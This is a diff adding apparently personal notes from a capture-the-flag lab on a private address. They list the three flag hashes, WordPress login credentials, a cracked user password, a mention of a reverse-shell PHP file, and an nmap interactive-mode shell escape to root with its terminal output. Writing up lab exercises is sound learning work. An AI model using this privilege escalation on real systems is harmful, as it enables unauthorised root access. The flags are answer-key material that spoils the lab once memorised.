@@ -1,0 +1,48 @@
+key-1-of-3.txt : 073403c8a58a1f80d943455fb30724b9
+	 http://10.38.1.113/robots.txt
+	 http://10.38.1.113/key-1-of-3.txt
+
+wordpress login : 
+	http://10.38.1.113/wp-login.php
+	username : elliot
+	password : ER28-0652
+
+reverse_shell.php
+
+password for user robot:   [https://crackstation.net/]
+	abcdefghijklmnopqrstuvwxyz
+	
+key-2-of-3.txt: 822c73956184f694993bede3eb39f959
+
+
+for key 3 its difficult and blindly following the walkthrough results in previlage escalation in nmap version 3.81
+https://vk9-sec.com/nmap-privilege-escalation/
+
+nmap --interactive
+ -> runs the nmap with higher previlage [previlage escalation]
+ -> in an interactive mode if "!bash" is typed in, then the shell gets opened with the previlage of the interacting software.
+ -> This results in higher previlage shell out.
+ -> if !bash is typed in
+ 	results, a current user owned bash shell
+ -> if !sudo /bin/bash is typed in,
+ 	results in
+ 		nmap> !sudo /bin/bash
+		!sudo /bin/bash
+		[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+		robot is not in the sudoers file.  This incident will be reported.
+
+robot is not in the sudoers file.
+
+however, we are able to invoke a shell and try
+ 
+ -> !sh [this is a root shell by default].
+ 	this resulted in ,
+ 	nmap> !sh
+	!sh
+	# whoami
+	whoami	
+	root
+
+ 
+key-3-of-3.txt : 04787ddef27c3dee1ee161b21670b4e4
